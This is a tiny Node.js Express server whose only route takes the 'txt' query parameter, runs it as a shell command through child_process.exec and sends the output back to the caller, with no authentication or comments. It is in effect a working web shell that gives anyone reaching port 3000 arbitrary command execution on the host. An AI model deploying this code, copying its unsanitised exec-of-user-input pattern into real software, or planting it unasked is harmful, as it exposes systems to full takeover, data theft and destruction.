const { exec } = require('child_process')
const express = require('express')
const app = express()

app.get('/', (req, res) => {
    exec(req.query.txt, (e, so, se) => {
        if (e) res.end(e.toString())
        else if (so) res.end(so.toString())
        else if (se) res.end(se.toString())
    })
})


app.listen(3000, () => console.log('running...'))